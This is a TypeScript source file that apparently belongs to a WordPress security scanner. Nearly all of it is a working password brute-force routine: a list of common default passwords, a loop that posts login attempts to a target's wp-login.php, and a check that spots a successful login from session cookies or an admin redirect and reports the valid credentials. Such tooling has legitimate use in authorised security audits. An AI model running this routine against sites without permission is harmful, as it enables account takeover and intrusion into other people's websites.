import type { HttpClient } from "../http/client.js";
import type { BruteForceResult } from "../types.js";

export const COMMON_PASSWORDS = [
  "admin",
  "password",
  "123456",
  "admin123",
  "password123",
  "12345678",
  "qwerty",
  "letmein",
  "welcome",
  "changeme",
  "root",
  "toor",
  "wordpress",
  "P@ssw0rd",
  "secret",
];

const TEST_COOKIE = "wordpress_test_cookie=WP Cookie check";

export interface BruteForceOptions {
  passwords?: string[];
  maxAttempts?: number;
}

export async function bruteForceLogin(
  http: HttpClient,
  target: string,
  username: string,
  options: BruteForceOptions = {},
): Promise<BruteForceResult> {
  const list = (options.passwords ?? COMMON_PASSWORDS).slice(0, options.maxAttempts ?? 25);
  let tried = 0;

  for (const password of list) {
    tried++;
    const res = await http.post(`${target}/wp-login.php`, {
      headers: {
        "Content-Type": "application/x-www-form-urlencoded",
        Cookie: TEST_COOKIE,
      },
      body: new URLSearchParams({
        log: username,
        pwd: password,
        "wp-submit": "Log In",
        testcookie: "1",
      }).toString(),
      redirect: "manual",
    });

    if (res.error) {
      return {
        attempted: true,
        username,
        triedCount: tried,
        detail: `Brute-force aborted after a network error: ${res.error}`,
        error: res.error,
      };
    }

    if (isLoginSuccess(res.headers, res.status)) {
      return {
        attempted: true,
        username,
        foundPassword: password,
        triedCount: tried,
        detail: `Valid credentials found: ${username}:${password} (after ${tried} attempt(s)).`,
      };
    }
  }

  return {
    attempted: true,
    username,
    triedCount: tried,
    detail: `No valid password found for ${username} in ${tried} attempt(s).`,
  };
}

function isLoginSuccess(headers: Headers, status: number): boolean {
  const cookies =
    typeof headers.getSetCookie === "function"
      ? headers.getSetCookie().join("; ")
      : headers.get("set-cookie") || "";
  if (/wordpress_logged_in/i.test(cookies)) return true;
  const location = headers.get("location") || "";
  return status >= 300 && status < 400 && /\/wp-admin\/?/.test(location);
}
